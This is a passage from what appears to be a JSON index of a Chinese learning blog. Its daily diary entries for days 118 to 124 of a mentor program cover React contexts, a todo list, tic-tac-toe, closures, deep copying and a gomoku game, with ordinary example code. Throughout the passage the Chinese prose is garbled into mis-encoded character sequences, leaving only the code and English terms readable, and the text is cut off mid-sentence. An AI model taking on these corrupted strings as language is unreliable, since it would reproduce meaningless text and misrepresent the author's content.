å­¸åˆ°çš„äº‹æƒ…æ„Ÿè¦ºä¸»è¦å°±æ˜¯ç·´ç¿’æ€éº¼ä½¿ç”¨ hook å§ï¼å› ç‚ºå„˜ç®¡çŸ¥é“ hook çš„ä½œç”¨ï¼Œä½†ä¹Ÿä¸ä»£è¡¨ä½ çŸ¥é“è¦åœ¨ä»€éº¼æ™‚å€™æŠŠä»–å€‘æ‹¿å‡ºä¾†ç”¨ã€‚æ‰€ä»¥æˆ‘è¦ºå¾—é€™æ‰æ˜¯å­¸ React æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯æˆ‘æƒ³ç·´å¥½çš„éƒ¨åˆ†ã€‚ å¦å¤–æ˜¨å¤©æœ¬ä¾†æƒ³ç”¨ useContext ä¾†è™•ç† Loading çš„ stateï¼Œå¤§æ¦‚åƒé€™æ¨£ï¼š 1234567891011121314151617181920212223const [isLoading, setIsloading] = useState(false);return ( &lt;ThemeProvider theme={theme}&gt; &lt;GlobalStyle /&gt; {/* loading Context */} &lt;LoadingContext.Provider value={[isLoading, setIsloading]}&gt; &lt;AuthContext.Provider value={{ user, setUser }}&gt; &lt;Router&gt; &lt;NavBar /&gt; &lt;Routes&gt; &lt;Route path=\"/\" element={&lt;HomePage /&gt;} /&gt; &lt;Route path=\"/about\" element={&lt;AboutPage /&gt;} /&gt; &lt;Route path=\"/categories\" element={&lt;CategoriesPage /&gt;} /&gt; &lt;Route path=\"/posts\" element={&lt;PostsPage /&gt;} /&gt; &lt;Route path=\"/posts/:id\" element={&lt;SinglePostPage /&gt;} /&gt; &lt;Route path=\"/log-in\" element={&lt;LoginPage /&gt;} /&gt; &lt;Route path=\"/sign-up\" element={&lt;SignUpPage /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; &lt;/AuthContext.Provider&gt; &lt;/LoadingContext.Provider&gt; &lt;/ThemeProvider&gt;) ä½†ä¸çŸ¥é“æ˜¯ä¸æ˜¯è·Ÿ re-render çš„å•é¡Œæœ‰é—œï¼Œæˆ‘é€™æ¨£å­åšä»¥å¾Œæ²’æœ‰è¾¦æ³•åœ¨åº•ä¸‹çš„å­å…ƒä»¶ç”¨ setIsloading(false) æŠŠ loading é—œæ‰ QQã€‚ å¯èƒ½è¦å¤šç·´ç¿’çœ‹çœ‹æ‰èƒ½æ‰¾å‡ºå•é¡Œäº†ã€‚ é¡Œå¤–è©±é›–ç„¶å°ä½œå“å·²ç¶“æœ‰ä¸€äº›æƒ³æ³•äº†ï¼Œä¸éä¸çŸ¥é“è‡ªå·±åšä¸åšå¾—å‡ºä¾†ï¼Œå¸Œæœ›å¯ä»¥å§ï½ æœŸè¨±æ˜å¤©ä¹Ÿè¦ç¹¼çºŒåŠªåŠ›ç·´ç¿’ Reactã€‚","link":"/2022/04/12/mentor-program-day118/"},{"title":"mentor-program-day119","text":"ç¹¼çºŒå¾€ä¸‹å€‹é‡Œç¨‹ç¢‘å‰é€²ã€‚ é€²åº¦ä»Šå¤©æŠŠéƒ¨è½æ ¼åšæœ€å¾Œçš„å„ªåŒ–ï¼Œä¹ŸåŠ ä¸Šäº†æ–°å¢æ–‡ç« çš„åŠŸèƒ½ï¼Œæ‡‰è©²å·®ä¸å¤šå¾—å…ˆå‘Šä¸€å€‹æ®µè½äº†å§ï¼ æˆ‘ä¹Ÿé–‹äº†ä¸€å€‹ Repositoryï¼Œæ‰“ç®—ä¹‹å¾Œå†å›ä¾†æŠŠæƒ³åšçš„åŠŸèƒ½åŠ ä¸Šå»ã€‚ å¦å¤–ä¹Ÿåšäº†ä¸€äº›ç­†è¨˜ï¼š ä½¿ç”¨ useContext è¦æ³¨æ„çš„ç´°ç¯€ React åŸºæœ¬çš„è·¯ç”±çµæ§‹ ä½¿ç”¨ useState è¦æ³¨æ„åˆå§‹å€¼çš„è¨­å®š ä¸€äº›åœ¨æ‰‹æ©Ÿä¸Š CSS çš„å°ç´°ç¯€ é—œæ–¼æ˜¨å¤©ç¢°åˆ°çš„å•é¡Œä¹Ÿè§£æ±ºäº†ï¼Œå¾ˆå¥½ï¼ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©åœ¨è§£æ±º useContext çš„å•é¡Œä»¥å¾Œï¼Œæ„Ÿè¦ºæœ‰å° React çš„æ¸²æŸ“æ©Ÿåˆ¶æ›´ç†è§£ä¸€é»ã€‚åœ¨ä¸ç†Ÿæ‚‰çš„æƒ…æ³ä¸‹ï¼Œå¾ˆå¸¸æœƒæŠŠä¸€äº›è·Ÿ state æœ‰é—œçš„æ“ä½œå¯«åœ¨ Component è£¡ï¼Œç¶“éé€™æ¬¡å¾Œä¹Ÿç†è§£åˆ° useEffec çš„é‡è¦ä¹‹è™•ã€‚ å¦å¤–å¯« React çš„é€™å¹¾å¤©ä¹Ÿå­¸åˆ°æ¨¡çµ„åŒ–é–‹ç™¼çš„å¥½è™•ï¼Œç¾åœ¨å·²ç¶“è »ç¿’æ…£é€™ç¨®ã€Œæ‹†æˆä¸€å€‹ä¸€å€‹ã€çš„å¯«æ³•äº†ã€‚ä¸éé€™ä¹Ÿå¤šè™§äº† React æ˜¯å¾ˆåŸºæ–¼ JavaScript çš„æ¡†æ¶ï¼Œè·Ÿ Vue çš„ç†å¿µä¸å¤ªä¸€æ¨£ã€‚å®ƒæœ‰è‡ªå·±çš„å¦ä¸€å¥—æ©Ÿåˆ¶ï¼Œæ‰€ä»¥ä»¥å‰åœ¨å¯«çš„æ™‚å€™æ¯”è¼ƒé›£é«”æœƒåˆ°ã€Œæ¨¡çµ„åŒ–ã€çš„æ„Ÿè¦ºï¼ˆç´”ç²¹æˆ‘å€‹äººæƒ³æ³•ï¼‰ã€‚ ç¸½ä¹‹ï¼Œé›–ç„¶å¯èƒ½å¾ˆæœ‰å¾ˆå¤šåœ°æ–¹å¾—å­¸ï¼Œä½†å¯«åˆ°ç¾åœ¨é‚„æ˜¯è »å–œæ­¡ React é€™å¥—æ¡†æ¶çš„ï¼Œå¯«å¾—å¾ˆé–‹å¿ƒï¼ é¡Œå¤–è©±å¸Œæœ›æœ‰æœä¸€æ—¥æˆ‘ä¹Ÿèƒ½æ‹¿å‡ºä¸€å¥—å¾ˆæ£’çš„ä½œå“ã€‚ æœŸè¨±ç¹¼çºŒ Reactï¼Œä¹Ÿè¨±å¯ä»¥é–‹å§‹å¯«ä½œæ¥­äº†å§ã€‚","link":"/2022/04/13/mentor-program-day119/"},{"title":"mentor-program-day12","text":"è…¦å‹•çš„ç‰¹åˆ¥å¤šï¼Œæ™‚é–“éå¾—ç‰¹åˆ¥å¿«ã€‚ é€²åº¦ä»Šå¤© [ALG101] çœ‹åˆ° Unit3 çµæŸï¼Œæ²’æœ‰é”åˆ°é æœŸçš„é€²åº¦ï¼Œä½†åšé¡Œç›®çš„æ™‚å€™å­¸åˆ°äº†è »å¤šçŸ¥è­˜è·Ÿå°æŠ€å·§ï¼Œä¹Ÿåšäº†ä¸€äº›ç´€éŒ„ï¼š å¹¾å€‹æ°´æ¡¶ï¼Ÿ å¿«é€Ÿè½‰æˆäºŒé€²ä½çš„æ–¹æ³• è²ªå©ªçš„å°å· å­¸åˆ°çš„äº‹æƒ…å„˜ç®¡ä»¥å‰æœ‰çœ‹éè¬›è§£å½±ç‰‡ï¼Œä½†å…¶å¯¦ä¹Ÿå¿˜çš„å·®ä¸å¤šäº†ï¼Œæ‰€ä»¥ä»Šå¤©åœ¨åšé¡Œç›®æ™‚å¾ˆé–‹å¿ƒèƒ½å¤ è‡ªå·±æƒ³å‡ºè§£æ³•ï¼Œ ç¾åœ¨çš„è‡ªå·±æ¯”ä»¥å‰æ›´åŠ å°ˆå¿ƒåœ¨ç·´ç¿’è·Ÿåˆ†æè§£é¡Œéç¨‹ï¼ŒçœŸçš„å¡é—œæ™‚ä¹Ÿæœƒè©¦è‘—å»å°‹æ‰¾ç›¸é—œçš„ç­”æ¡ˆï¼Œç„¶å¾Œè©¦è‘—ç†è§£èƒŒå¾Œçš„æ¦‚å¿µã€‚ ä¹Ÿæœ‰ä¸€ä»¶è »ç‰¹åˆ¥çš„äº‹æƒ…ï¼ŒåŸæœ¬æˆ‘æ˜¯æ‰“ç®—åœ¨ Lidemy è¨è«–å€ æ‰¾ä¸€äº›æœ‰ç”¨çš„è³‡è¨Šï¼Œçµæœå‰›å¥½çœ‹åˆ°æŸå€‹äººå¯«çš„ codeï¼Œå°±é †é“ç ”ç©¶äº†ä¸€ä¸‹åˆ¥äººçš„è§£é¡Œæ€ç¶­ã€‚ å…¶å¯¦é‚£å€‹äººçš„æ•´é«”çš„è§£é¡Œæ€ç¶­ä¸èƒ½èªªæ˜¯æœ€å®Œç¾çš„ï¼Œä½†æ˜¯å¾ä»–èº«ä¸Šæˆ‘å­¸åˆ°äº†é‹ç”¨å…§å»ºå‡½å¼çš„æŠ€å·§ï¼Œæˆ‘èªç‚ºé€™æ˜¯è »å€¼å¾—çš„ä¸€ä»¶äº‹æƒ…ã€‚ ä¹Ÿè¨±åœ¨æ¯å€‹äººçš„èº«ä¸Šéƒ½èƒ½æ‰¾åˆ°å€¼å¾—å­¸ç¿’çš„åœ°æ–¹ï¼Œæ‰€ä»¥æˆ‘é‚„è »å–œæ­¡çœ‹åˆ¥äººè¨è«–å•é¡Œæˆ–è€…å¯«å®Œé¡Œç›®å¾Œå»çœ‹åˆ¥äººçš„è§£æ³•ï¼Œåœ¨é€™å€‹éç¨‹ä¸­æˆ‘ç¸½èƒ½å¾—åˆ°ä¸€äº›æ–°çš„æƒ³æ³•ï¼Œæˆ–æ˜¯æ„å¤–ç™¼ç¾ä¸€äº›åŸæœ¬è‡ªå·±ä¸çŸ¥é“çš„äº‹æƒ…ã€‚ é¡Œå¤–è©±æ˜¯èªªä»Šå¤©æ”¶åˆ°äº†æ‡‰å¾µçš„æ„Ÿè¬å‡½ã€‚ä¹Ÿè¨±æ˜¯å› ç‚ºç¬¬ä¸€æ¬¡æ”¶åˆ°ï¼Œæ„Ÿè¦ºé‚„æŒºå¾®å¦™çš„ï¼ŸåŸä¾†é‚„çœŸçš„æœ‰å…¬å¸æœƒå¯„æ„Ÿè¬å‡½ XD è–èª•ç¯€æ˜¯å€‹æµªæ¼«çš„ç¯€æ—¥ï¼Œå¸Œæœ›ä»Šå¹´å¯ä»¥è·Ÿå¥³æœ‹å‹ä¸€èµ·å¿«æ¨‚åœ°åº¦éå¹³å®‰å¤œã€‚ æœŸè¨±ä¹Ÿè¨±é€™é€±çš„é€²åº¦æ¯”è¼ƒè¶•ï¼Œç¸½æ˜¯æ²’èƒ½é”æˆé æœŸç›®æ¨™ã€‚ å¸Œæœ›æ˜å¤©çœŸçš„å¯ä»¥æŠŠ week2 çš„é€²åº¦çµ¦çµæŸï¼Œçœ‹äº†ä¸€ä¸‹å…§å®¹æ„Ÿè¦ºæ˜¯æœ‰æ©Ÿæœƒçš„ï¼Ÿ åŠ æ²¹åŠ æ²¹ï¼","link":"/2021/12/23/mentor-program-day12/"},{"title":"mentor-program-day120","text":"åŸä¾†å››å€‹æœˆéå»äº†ã€‚ é€²åº¦ä»Šå¤©é–‹å§‹æŠŠç¬¬ä¸€å€‹ todo list ä½œæ¥­åšå®Œæ•´ï¼ŒæŠŠè©²åšçš„åŠŸèƒ½éƒ½è£œä¸Šäº†ï¼š å¾ä»¥å‰å°±è¦ºå¾—ç·¨è¼¯çš„åŠŸèƒ½æœ€é›£åšï¼Œé€™æ¬¡ä¹Ÿå·®ä¸å¤šã€‚é›–ç„¶åšæ˜¯åšå‡ºä¾†äº†ï¼Œä½†é‚„æ˜¯æœ‰äº›åœ°æ–¹é‚„ä¸å¤ªæ‡‚ï¼Œå¯èƒ½å¾—åœ¨å¤šç·´ç¿’æˆ–æ‰¾è³‡æ–™ä¾†çœ‹çœ‹å§ã€‚ é¡Œå¤–è©±ï¼Œæˆ‘å€‘ç¾åœ¨å¾ Store ä¸Šä¸‹è¼‰çš„ todo app å…¶å¯¦çœŸçš„è—äº†å¾ˆå¤šç´°ç¯€åœ¨è£¡é¢ï¼Œåƒæ˜¯ï¼š åœ¨ç·¨è¼¯æŸå€‹ todo æ™‚ï¼Œå¦‚æœåˆå»é»å…¶ä»–çš„ç·¨è¼¯ï¼Œè¦è¨˜å¾—æŠŠä¸Šä¸€å€‹ç·¨è¼¯ä¸­çš„ç‹€æ…‹çµ¦ clearï¼ˆé€™å€‹å¾ˆå¤šåŒå­¸æ²’æ³¨æ„åˆ°ï¼‰ ç·¨è¼¯ todo æ™‚ï¼Œå¦‚æœå…§å®¹æ˜¯ç©ºçš„æ‡‰è©²è¦æ“‹ä¸‹ä¾† &lt;input&gt; é€™æ±è¥¿å¦‚æœå­—å¤ªå°ï¼ˆ&lt;16pxï¼‰ï¼Œåœ¨ focus çš„æ™‚å€™æœƒè‡ªå‹• zoomingï¼Œä½¿ç”¨é«”é©—ä¸å¥½ åœ¨ç·¨è¼¯æ™‚ï¼Œæ‡‰è©²è¦æŠŠåŸæœ¬çš„ã€Œå·²å®Œæˆã€ï¼Œã€Œåˆªé™¤ã€æŒ‰éˆ•çµ¦éš±è—èµ·ä¾†æ¯”è¼ƒåˆç†ã€‚ é‚„æœ‰å…¶ä»–å¤ªå¤šç´°ç¯€èƒ½åšäº†ï¼Œç‰¹åˆ¥æ˜¯è·Ÿã€Œç·¨è¼¯ã€æœ‰é—œçš„åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘æ‰æœƒèªªç·¨è¼¯æ˜¯æœ€é›£åšçš„ä¸€å¡Šã€‚ å­¸åˆ°çš„äº‹æƒ…ä¾†æŠŠä¸€äº›æˆ‘è¦ºå¾—é‚„è »é‡è¦çš„æ±è¥¿çµ¦ç´€éŒ„ä¸€ä¸‹ï¼š é€éæ¢ä»¶æ¸²æŸ“çš„ Component æ™‚ï¼ŒuseRef æ²’è¾¦æ³•æŠ“åˆ°æ­£ç¢ºçš„å€¼ onBlur æ˜¯ä¸€å€‹å¾ˆå¥½ç”¨çš„äº‹ä»¶ï¼ˆå¯ä»¥è™•ç†é›¢é–‹ç·¨è¼¯çš„ç‹€æ…‹ï¼‰ derived state è·Ÿ state çš„å·®åˆ¥ï¼ˆé€™å€‹çµ•å°é‡è¦ï¼‰ ç¸½ä¹‹åœ¨å¤šç·´ç¿’å§ï¼Œæ„Ÿè¦ºç›®å‰å¯«çš„ code é‚„æœ‰å¾ˆå¤šåœ°æ–¹èƒ½åšå„ªåŒ–ã€‚ é¡Œå¤–è©±ä¸çŸ¥é“å°å‚¢ä¼™å€‘ç¾åœ¨éçš„æ€éº¼æ¨£ï¼Œå¸Œæœ›ä»–å€‘æ˜¯å¿«å¿«æ¨‚æ¨‚çš„ã€‚ æœŸè¨±æ˜å¤©è¦æŠŠ code åšå„ªåŒ–ï¼Œç„¶å¾Œé–‹å§‹ç ”ç©¶äº”å­æ£‹è©²æ€éº¼åšäº†ã€‚","link":"/2022/04/14/mentor-program-day120/"},{"title":"mentor-program-day121","text":"é‹è½‰å§ï¼Œå¤§è…¦ã€‚ é€²åº¦ä»Šå¤©æŠŠ todo list åšæœ€å¾Œçš„ UI èª¿æ•´ï¼Œåˆ°é€™é‚Šå‘Šä¸€æ®µè½ï¼š æ¥ä¸‹ä¾†ï¼Œç‚ºäº†åšå‡ºäº”å­æ£‹ï¼Œé¦–å…ˆå¾—å»å…ˆç ”ç©¶ React å®˜æ–¹æ•™å­¸ çš„åœˆåœˆå‰å‰ã€‚ ä¸ç®¡æ˜¯å¯«ä»€éº¼æ‡‰ç”¨ç¨‹å¼ï¼ŒçœŸçš„éƒ½æ˜¯é­”é¬¼è—åœ¨ç´°ç¯€è£¡ã€‚åŸä¾†ä¸€å€‹ç°¡å–®çš„åœˆåœˆå‰å‰ä¹Ÿèƒ½è—é€™éº¼å¤šç´°ç¯€åœ¨è£¡é¢ã€‚ ç›®å‰é‚„åœ¨ç ”ç©¶æ•´é«”æ€è·¯ï¼Œå¸Œæœ›æ˜å¤©èƒ½æŠŠå®ƒå¼„æ¸…æ¥šã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨è®€å®˜æ–¹æ–‡ä»¶çš„ç¯„ä¾‹æ™‚ï¼Œæ·±æ·±é«”æœƒåˆ° Closure çš„é‡è¦æ€§ï¼Œæ‹¿ä¸‹é¢é€™æ®µ code ä¾†èˆ‰ä¾‹ï¼š 12345678renderSquare(i) { return ( &lt;Square value={this.state.squares[i]} onClick={() =&gt; this.handleClick(i)} /&gt; );} å¦‚æœä¸æ‡‚ Closureï¼Œçµ•å°ä¸èƒ½ç†è§£ç‚ºä»€éº¼ &lt;Square /&gt; è£¡å¯ä»¥æ‹¿åˆ° i çš„å€¼ï¼š 12345678910111213class Square extends React.Component { render() { return ( &lt;button className=\"square\" // å…¶å¯¦å°±ç­‰æ–¼ () =&gt; this.handleClick(i) onClick={() =&gt; this.props.onClick()} &gt; {this.props.value} &lt;/button&gt; ); }} å› ç‚º Closure çš„é—œä¿‚ï¼Œæ¯å€‹ &lt;Square /&gt; åœ¨ç¶å®š onClick æ™‚å°±å·²ç¶“è¢«æŒ‡å®š i çš„å€¼äº†ï¼Œæ‰€ä»¥å…¶å¯¦èƒ½çœ‹æˆé€™æ¨£å­ï¼š 1234&lt;button onClick={() =&gt; this.props.onClick(0)}&gt;&lt;/button&gt;&lt;button onClick={() =&gt; this.props.onClick(1)}&gt;&lt;/button&gt;&lt;button onClick={() =&gt; this.props.onClick(2)}&gt;&lt;/button&gt;... åªèƒ½èªªé€™å°±æ˜¯ React æœ‰è¶£ä½†ä¹Ÿå›°é›£çš„åœ°æ–¹ï¼Œç†è§£çš„è©±å°±æœƒè¦ºå¾—ã€Œå“‡ï¼ŒåŸä¾†é‚„æœ‰é€™æ‹›ã€ï¼Œä¸ç†è§£çš„è©±å°±æœƒè¦ºå¾—ã€ŒWhat theâ€¦ é€™å•¥ã€ã€‚ é¡Œå¤–è©±çª¯çƒ¤çš„é¦¬éˆ´è–¯æœ‰ä¸€å€‹çª¯çƒ¤çš„é¦™å‘³ï¼ˆå»¢è©±ï¼Ÿ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠåœˆåœˆå‰å‰çš„ã€Œæ™‚å…‰æ—…è¡Œã€ææ‡‚ã€‚","link":"/2022/04/15/mentor-program-day121/"},{"title":"mentor-program-day122","text":"ä¸èªè¼¸ï¼Œç¹¼çºŒå¥®é¬¥ã€‚ é€²åº¦ä»Šå¤©è·Ÿåœˆåœˆå‰å‰å¥®é¬¥äº†ä¸€æ•´å¤©ï¼Œå·®ä¸å¤šå¿«é‡æ¸…æ•´å€‹æ€è·¯äº†ï¼Œé‚„å·®ä¸€é»å°±å®Œæˆäº†ã€‚å…ˆé™„ä¸Šç¬¬ä¸€ç¯‡ç­†è¨˜ æƒ³ç”¨ React åšå‡ºäº”å­æ£‹å—ï¼Ÿå…ˆå¾åœˆåœˆå‰å‰é–‹å§‹å§ï¼Œç›¸ä¿¡æ˜å¤©å°±èƒ½æå®šï¼ŒåŠ æ²¹ï¼ å­¸åˆ°çš„äº‹æƒ…åœ¨è®€å®˜æ–¹æ–‡ä»¶æ™‚ï¼Œç™¼ç¾èƒŒå¾Œé‚„è—äº†è »å¤šé‚£äº›é€²éš JavaScript çš„çŸ¥è­˜ï¼Œæœ€å¸¸è¦‹çš„å°±æ˜¯ this è·Ÿ closureã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œå®˜æ–¹åœ¨è™•ç† this å€¼æ˜¯é€™æ¨£åšçš„ï¼š 12345678910111213141516171819202122232425class Board extends React.Component { constructor(props) { super(props); this.state = { squares: Array(9).fill(null), }; } handleClick(i) { const squares = this.state.squares.slice(); squares[i] = 'X'; this.setState({squares: squares}); } renderSquare(i) { return ( &lt;Square value={this.state.squares[i]} // ç”¨ arrow function ä¾†ç¶å®š onClick={() =&gt; this.handleClick(i)} /&gt; ); } // ...} ç®­é ­å‡½å¼é›–ç„¶å¯«èµ·ä¾†ä¹¾æ·¨ï¼Œä½†ç¼ºé»æ˜¯å¯è®€æ€§ä¸æ˜¯é‚£éº¼å¥½ï¼Œæ‰€ä»¥æˆ‘åŸæœ¬çœ‹ä¸å¤ªæ‡‚å®˜æ–¹ç‰¹åˆ¥å¼·èª¿é€™é‚Šç”¨ç®­é ­å‡½å¼çš„åŸå› æ˜¯ä»€éº¼ã€‚ä¸éå¾Œä¾†å» codepen è½‰æ›ä¸€ä¸‹å¯«æ³•å°±æ‡‚äº†ï¼š 1234567891011121314renderSquare () { return ( &lt;Square value={this.state.squares[i]} // å¤–é¢åŒ…ä¸€å±¤ function onClick={function wrapper () { // 1. onClick æ™‚ å‘¼å« wrapper // 2. åŸ·è¡Œ wrapper æ™‚åˆå†å‘¼å« this.handleClick(i) // 3. è‡³æ–¼ i çš„å€¼æœƒæ˜¯é€é scope chain æ‰¾åˆ°ç•¶åˆåŸ·è¡Œ renderSquare çš„ i this.handleClick(i) }} /&gt; )} ç†è§£å®Œé€™äº›ä»¥å¾Œï¼Œæˆ‘æ‰æ˜ç™½ç•¶ä½ å°ä¸€å€‹æ±è¥¿ä¸äº†è§£æ™‚ï¼Œä½ å¯ä»¥è©¦è‘—åƒé€™æ¨£æŠ½çµ²å‰ç¹­ï¼ŒæŠŠé‚£äº›ç°¡åŒ–å¾Œçš„æ±è¥¿æ‰“ä¸€æ­¥ä¸€æ­¥æ‰“å›åŸå½¢ã€‚é€šå¸¸é€™æ¨£åšä»¥å¾Œå°±æœƒæ…¢æ…¢æ‰¾å‡ºç­”æ¡ˆäº†ã€‚ é¡Œå¤–è©±è½èªªå—éŸ“å·²ç¶“é–‹å§‹æ”¾å¯¬é˜²ç–«åˆ¶åº¦äº†ï¼Œå°ç£ä¹Ÿä¼¼ä¹ä¹Ÿæ‰“ç®—é€™æ¨£åšã€‚ ä¸çŸ¥é“æœªä¾†æœƒæ€éº¼æ¨£ï¼Œç¸½ä¹‹é‚„æ˜¯å¸Œæœ›å¤§å®¶èƒ½å¹³å®‰ç„¡äº‹å°±å¥½ã€‚ æœŸè¨±æ˜å¤©è¦æŠŠåœˆåœˆå‰å‰æå®šï¼Œç„¶å¾Œé–‹å§‹æäº”å­æ£‹ã€‚","link":"/2022/04/16/mentor-program-day122/"},{"title":"mentor-program-day123","text":"ç‡’è…¦çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©çµ‚æ–¼é–‹å§‹åšå‰äººæåˆ°çš„å¤§é­”ç‹ï¼šäº”å­æ£‹ã€‚ ç›®å‰åªåšå‡ºäº†åŸºæœ¬çš„ç‰ˆé¢è·Ÿä¸‹æ£‹åŠŸèƒ½ï¼š ä½†æ˜¯åˆ¤æ–·è¼¸è´çš„æ–¹æ³•æƒ³äº†ä¸€æ™šé‚„æ˜¯æ²’æƒ³å‡ºä¾†rrrr åªå¥½ç•™åˆ°æ˜å¤©ç¹¼çºŒæˆ°é¬¥ï¼åŠ æ²¹ï¼ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å‰›é–‹å§‹åšäº”å­æ£‹æ™‚ï¼Œæœ¬ä¾†æƒ³ç”¨åœˆåœˆå‰å‰çš„è³‡æ–™çµæ§‹ä¾†åšï¼š 12345const data = [ \"O\", null, \"X\", \"O\", null, null, \"X\", null, null] é€™æ¨£å­åšä»¥å¾Œç•«é¢ç¢ºå¯¦å¯ä»¥é‹ä½œï¼Œä½†æ˜¯å°±å¡åœ¨åˆ¤æ–·è¼¸è´çš„é‚è¼¯ä¸çŸ¥é“è©²æ€éº¼å¯«æ‰å¥½ã€‚ä¸Šç¶²æŸ¥è³‡æ–™æ‰¾åˆ°çš„å…¨éƒ¨éƒ½æ˜¯ç”¨ã€ŒäºŒç¶­é™£åˆ—ã€çš„çµæ§‹ä¾†è§£çš„ã€‚æ–¼æ˜¯åªå¥½ç æ‰é‡ç·´ï¼Œä¹–ä¹–ç”¨äºŒç¶­é™£åˆ—ä¾†é‡åšï¼ˆé›–ç„¶æˆ‘çœŸçš„å¾ˆä¸æƒ³ç¢°äºŒç¶­çš„é™£åˆ—æˆ–ç‰©ä»¶QQï¼‰ã€‚ å‰›é–‹å§‹çœŸçš„é‚„è »ç‡’è…¦çš„ï¼Œå¤ªä¹…æ²’ç¢°é€™ç¨®æ¯”è¼ƒè¤‡é›œçš„è³‡æ–™çµæ§‹äº†ï¼Œå†åŠ ä¸Šåˆå¾—ç”¨é›™å±¤è¿´åœˆä¾†è™•ç†ã€‚å¥½åœ¨å¾Œä¾†éœä¸‹ä¾†ä¸€æœƒå…’å¾Œæœ‰æ…¢æ…¢é‡æ¸…æ€ç·’ï¼Œä¸€æ­¥ä¸€æ­¥æŠŠåŸºæœ¬çš„æ±è¥¿å…ˆå¯«å‡ºä¾†äº†ã€‚ å¾Œä¾†ä¹Ÿæ„å¤–åœ°è¸©åˆ°ã€Œæ·ºæ‹·è²ã€çš„åœ°é›·ï¼Œæ‰€ä»¥å¯«äº†é€™ç¯‡ç­†è¨˜ï¼šè©²ä¾†è«‡è«‡æ·ºæ‹·è²ï¼ˆShallow copyï¼‰èˆ‡æ·±æ‹·è²ï¼ˆDeep copyï¼‰äº† åŸæœ¬æˆ‘é‚„æƒ³èªª JSON.parse(JSON.stringify(data)) æ˜¯ä»€éº¼è„«è¤²å­æ”¾å±çš„è¡Œç‚ºï¼Œå¾Œä¾†æ‰çŸ¥é“åŸä¾†é€™å°±æ˜¯ deep copy é˜¿ï¼ŒçœŸçš„æ˜¯å¤ªè ¢äº†ï½ ç¸½ä¹‹ï¼Œé›–ç„¶æ˜¯å¾ˆç‡’è…¦çš„ä¸€å¤©ï¼Œä½†ä¹Ÿå­¸åˆ°äº†è »å¤šæ±è¥¿ã€‚ é¡Œå¤–è©±å–œæ­¡è½å”±æ­Œå¥½è½çš„äººå”±æ­Œã€‚æˆ‘è¦ºå¾—å”±æ­Œå¥½é›£å‘€ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©èƒ½æŠŠè¼¸è´çš„é‚è¼¯å¯«å‡ºä¾†ï¼è¡äº†ï¼","link":"/2022/04/17/mentor-program-day123/"},{"title":"mentor-program-day124","text":"ç¹¼çºŒèµ°ä¸‹å»ã€‚ é€²åº¦ä»Šå¤©çµ‚æ–¼æ˜¯æŠŠäº”å­æ£‹å®Œæˆäº†ï¼Œå…ˆé™„ä¸Šæˆæœåœ–ï¼š ä¸éæœ‰é»å°å‚·å¿ƒï¼Œæ˜¯é—œæ–¼åˆ¤æ–·è¼¸è´çš„éƒ¨åˆ†ã€‚åŸæœ¬å·²ç¶“æŠŠæ©«æ’èˆ‡ç›´æ’çš„åˆ¤æ–·çµ¦å¯«å‡ºä¾†äº†ï¼Œä½†å°±å·®åœ¨æ–œæ’çš„éƒ¨åˆ†ä¸çŸ¥é“è©²æ€éº¼å¯«æ‰å¥½ã€‚ éç¨‹ä¸­ä¸€æ¨£çˆ¬äº†è »å¤šç¯‡æ–‡ç« ï¼Œä½†æ„Ÿè¦ºéƒ½ä¸å¤ªèƒ½ç†è§£ï¼Œçœ‹åˆ°å„ç¨®ä¸‰å±¤è¿´åœˆï¼Œç¸½è¦ºå¾—æœ‰é»å¤ªéè¤‡é›œåŒ–çš„æ„Ÿè¦ºã€‚æ–¼æ˜¯æœ€å¾Œåƒè€ƒäº† Huli å¯«çš„ ç¯„ä¾‹ã€‚ é€™å€‹éç¨‹å°±æ˜¯ä¸€è¡Œä¸€è¡Œ code é‚Šç…§è‘—æ‰“é‚Šæ€è€ƒï¼Œæœ€å¾Œæ‰ç†è§£åŸä¾†åªè¦ã€Œä»¥ä¸‹æ£‹é»ç‚ºä¸­å¿ƒã€ä¾†æ€è€ƒï¼Œåœ¨åˆ©ç”¨ do...while å…¶å¯¦å°±å¯ä»¥åˆ¤æ–·æ‡‰ä»˜æ‰€æœ‰ case äº†ã€‚ å­¸åˆ°çš„äº‹æƒ…ä¹Ÿè¨±æ˜¯è‡ªå·±é‚„æ˜¯ä¸å¤ å²å®³ï¼Œåªæ˜¯å€‹å°éŠæˆ²è€Œå·²å»ä¹Ÿå¯«ä¸å¤ªå¥½ï¼Œä¸éé‚„æ˜¯è¦ç¹¼çºŒæ›´åŠ æ²¹ä¸‹å»å§ã€‚ å¾äº”å­æ£‹é€™å€‹ä½œæ¥­è£¡é¢é™¤äº†å­¸åˆ° React çš„æ€ç¶­ï¼Œä¹Ÿç¢°åˆ°äº†ä¸€äº›ä»¥å‰å­¸åˆ°çš„ JavaScript é€²éšæ¦‚å¿µï¼Œæœ€æ·±åˆ»çš„å¤§æ¦‚å°±æ˜¯ã€Œæ·º/æ·±æ‹·è²ã€å’Œã€Œé–‰åŒ…ã€äº†å§ã€‚ ç•¶ç„¶ï¼Œé‚„æœ‰é‚£å€‹é¡§äººæ€¨çš„ this å€¼ï¼ˆå¦‚æœæ˜¯å¯« class componentï¼‰ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œå¸Œæœ›è‡ªå·±æ¥ä¸‹ä¾†è¦æ›´åŠªåŠ›æŠŠæ±è¥¿å­¸å¥½ã€‚ é¡Œå¤–è©±æˆ‘ä»¥å‰ç¸½èªç‚ºã€Œå¾ˆæœƒå¯«ç¨‹å¼ã€çš„å®šç¾©æ˜¯èƒ½ç”¨çŸ­çŸ­å¹¾è¡Œ code ä¾†è§£æ±ºå•é¡Œã€‚ ä½†ç¶“éé€™å¹¾å¹´çš„æ™‚é–“ï¼Œæˆ‘ç¾åœ¨èªç‚ºçœŸæ­£å²å®³çš„äººæ˜¯èƒ½å¤ 